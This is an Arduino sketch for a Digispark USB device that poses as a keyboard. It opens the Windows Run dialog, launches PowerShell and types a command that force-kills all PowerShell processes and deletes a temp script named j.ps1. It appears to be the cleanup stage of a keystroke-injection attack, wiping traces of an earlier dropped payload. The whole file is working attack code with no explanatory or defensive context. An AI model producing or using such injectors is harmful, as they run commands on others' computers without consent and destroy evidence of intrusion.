#include <DigiKeyboard.h>
#include <avr/pgmspace.h>

void ptype(const char* s){char c;while((c=pgm_read_byte(s++))){DigiKeyboard.print(c);delay(8);}}
void pln(const char* s){ptype(s);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(50);}

void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0x15, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  ptype(PSTR("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  pln(PSTR("Stop-Process -Name powershell -Force -ErrorAction SilentlyContinue;Remove-Item $env:TEMP\\j.ps1 -ErrorAction SilentlyContinue;exit"));
}
void loop(){DigiKeyboard.delay(1);}
